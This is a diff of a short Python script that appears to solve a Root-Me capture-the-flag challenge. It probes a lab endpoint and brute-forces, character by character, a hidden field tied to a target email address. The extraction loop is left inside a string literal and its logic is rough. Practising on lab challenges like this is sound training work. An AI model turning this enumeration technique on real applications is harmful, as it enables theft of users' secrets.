@@ -28,20 +28,27 @@ class Ransack:
 
         charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*"
 
-        if self.sendPayload("z"):
-            print("Valide")
-        else:
+        if not self.sendPayload("a"):
             print("Invalide")
+        else:
+            print("Valide")
 
-        #payload = ""
-        #for c in charset:
-        #    payload += c
-        #    if not self.sendPayload(payload):
-        #        payload = payload[:-1]
-
+"""
+        payload = ""
+        i = 0
+        while i < 10:
+            for c in charset:
+                payload += c
+                print(f"[ ] Attempting '{payload}'")
+                if not self.sendPayload(payload):
+                    payload = payload[:-1]
+                    print("[-] Nope restaure to", payload)
+                i += 1
+        return payload"""
 
 url     = "http://challenge01.root-me.org:59097/users"
 target  = "gwittfeld@example.com"
 exploit = Ransack(url)
 exploit.setTarget(target)
-exploit.getPost()
+print("[+] Start searching...")
+print(exploit.getPost())
